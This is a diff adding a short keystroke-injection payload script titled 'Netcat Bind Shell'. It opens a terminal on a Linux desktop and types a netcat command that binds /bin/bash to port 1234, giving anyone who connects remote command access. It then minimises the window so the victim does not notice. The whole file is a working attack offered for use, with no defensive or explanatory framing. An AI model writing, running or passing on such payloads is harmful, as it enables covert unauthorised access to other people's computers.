@@ -1,0 +1,16 @@
+REM Title: Netcat Bind Shell
+REM Author: UndedInside
+REM Description: Start a bind shell
+
+REM Open new terminal window
+DEFAULT_DELAY 400
+ALT t
+DELAY 1000
+
+REM Start bind shell
+REM The port can be changed if required
+STRING nc -l -p 1234 -e /bin/bash
+ENTER
+
+REM Minimise window to run stealthily
+ALT F9
